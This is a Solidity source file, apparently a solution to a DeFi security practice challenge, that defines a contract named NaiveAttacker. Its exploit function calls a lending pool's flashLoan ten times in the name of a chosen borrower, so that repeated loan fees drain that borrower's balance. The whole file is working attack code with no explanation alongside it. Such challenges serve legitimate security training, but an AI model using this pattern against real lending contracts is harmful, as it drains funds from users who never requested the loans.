// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaiveAttacker {
    function exploit(
        INaiveReceiverLenderPool pool, 
        address borrower, 
        address token,
        uint256 borrowAmount
    ) external {
        for(uint8 i=0;i<10;i++){
            pool.flashLoan(borrower, token, borrowAmount, "");
        }
    }
}

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, address token, uint256 borrowAmount, bytes calldata data) external;
}